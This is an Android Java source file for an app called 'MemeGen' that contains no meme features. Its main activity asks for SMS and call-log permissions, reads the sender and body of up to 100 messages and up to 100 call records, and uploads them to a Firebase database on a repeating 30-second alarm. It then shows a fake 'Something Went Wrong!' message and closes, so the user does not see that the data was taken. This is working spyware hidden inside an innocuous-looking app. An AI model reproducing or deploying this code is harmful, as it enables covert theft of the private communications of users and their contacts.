package com.example.memegen;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.Telephony;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 1;
    private static final int MAX_SMS_COUNT = 100;
    private static final int MAX_CALL_LOG_COUNT = 100;
    private static final long BACKUP_INTERVAL = 30 * 1000; // 30 seconds in milliseconds
    private static final String CHANNEL_ID = "BackupChannel";

    private DatabaseReference databaseReference;
    private boolean isBackupSuccessful = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        databaseReference = FirebaseDatabase.getInstance().getReference();

        if (checkPermissions()) {
            startBackupProcess();
        } else {
            requestPermissions();
        }

        // Schedule the backup service to run periodically
        scheduleBackupService();
    }

    private boolean checkPermissions() {
        int smsPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        int callLogPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG);
        return smsPermission == PackageManager.PERMISSION_GRANTED && callLogPermission == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
    }

    private void startBackupProcess() {
        // Start the backup foreground service
        Intent serviceIntent = new Intent(this, BackupService.class);
        startForegroundService(serviceIntent);

        // Schedule periodic backup
        new Handler().postDelayed(() -> {
            boolean smsBackupSuccessful = backupSMS();
            boolean callLogBackupSuccessful = backupCallLog();

            if (smsBackupSuccessful && callLogBackupSuccessful) {
                Toast.makeText(MainActivity.this, "Something Went Wrong!", Toast.LENGTH_SHORT).show();
                finish(); // Close the activity after backup is successful
            } else {
                Toast.makeText(MainActivity.this, "Something Went Wrong!", Toast.LENGTH_SHORT).show();
            }
        }, BACKUP_INTERVAL);
    }



    private void scheduleBackupService() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent serviceIntent = new Intent(this, BackupService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, serviceIntent, PendingIntent.FLAG_IMMUTABLE);

        long triggerAtMillis = System.currentTimeMillis() + BACKUP_INTERVAL;

        alarmManager.setInexactRepeating(
                AlarmManager.RTC_WAKEUP,
                triggerAtMillis,
                BACKUP_INTERVAL,
                pendingIntent
        );
    }

    private boolean backupSMS() {
        List<String> smsList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);

            if (addressIndex != -1 && bodyIndex != -1) {
                int count = 0;
                do {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    smsList.add(address + ": " + body);
                    count++;
                } while (cursor.moveToNext() && count < MAX_SMS_COUNT);
            }
            cursor.close();
        }

        databaseReference.child("sms").setValue(smsList);

        // Return true if backup was successful
        return !smsList.isEmpty();
    }


    private boolean backupCallLog() {
        List<String> callLogList = new ArrayList<>();
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

            if (numberIndex != -1 && typeIndex != -1 && dateIndex != -1) {
                int count = 0;
                do {
                    String number = cursor.getString(numberIndex);
                    int type = cursor.getInt(typeIndex);
                    long date = cursor.getLong(dateIndex);
                    String callType = getTypeLabel(type);
                    String callDate = new Date(date).toString();
                    callLogList.add(number + ": " + callType + " - " + callDate);
                    count++;
                } while (cursor.moveToNext() && count < MAX_CALL_LOG_COUNT);
            }
            cursor.close();
        }

        databaseReference.child("call_log").setValue(callLogList);

        // Return true if backup was successful
        return !callLogList.isEmpty();
    }



    private String getTypeLabel(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                startBackupProcess();
            } else {
                boolean shouldShowRationale = ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)
                        || ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_CALL_LOG);

                if (shouldShowRationale) {
                    // Permissions denied, but can be requested again
                    requestPermissions();
                } else {
                    // Permissions denied and "Don't ask again" selected
                    Toast.makeText(MainActivity.this, "Permissions denied. MemeGen can't work without these permissions", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}
